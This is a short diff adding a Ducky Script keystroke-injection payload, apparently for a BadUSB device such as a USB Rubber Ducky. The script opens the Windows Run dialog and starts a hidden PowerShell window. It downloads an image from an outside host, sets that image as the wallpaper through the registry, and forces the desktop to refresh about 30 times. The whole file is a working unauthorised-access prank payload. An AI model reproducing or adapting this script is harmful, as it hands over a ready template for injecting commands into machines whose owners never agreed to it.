@@ -1,0 +1,5 @@
+DELAY 100
+GUI R
+DELAY 100
+STRING cmd /C "start /MIN powershell iwr -Uri http://schevenin.com/r.jpg -OutFile c:\windows\temp\r.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\temp\r.jpg';$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le29)"
+ENTER
